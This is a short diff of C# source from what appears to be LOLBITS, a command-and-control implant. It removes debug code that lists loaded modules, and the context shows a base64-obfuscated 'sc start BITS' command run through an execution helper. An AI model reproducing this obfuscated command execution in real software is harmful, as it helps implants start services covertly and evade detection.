@@ -51,14 +51,6 @@ namespace LOLBITS.Controlling
         public void Start()
         {
 
-            Process proc = Process.GetCurrentProcess();
-
-            foreach (var module in proc.Modules)
-            {
-                Console.WriteLine(string.Format("Module: {0}", module.ToString()));
-            }
-            Thread.Sleep(20000000);
-
             string startBits = Encoding.UTF8.GetString(Convert.FromBase64String("c2Mgc3RhcnQgQklUUw=="));
             Utils.ExecuteCommand(startBits, _sysCall);
             Thread.Sleep(500);
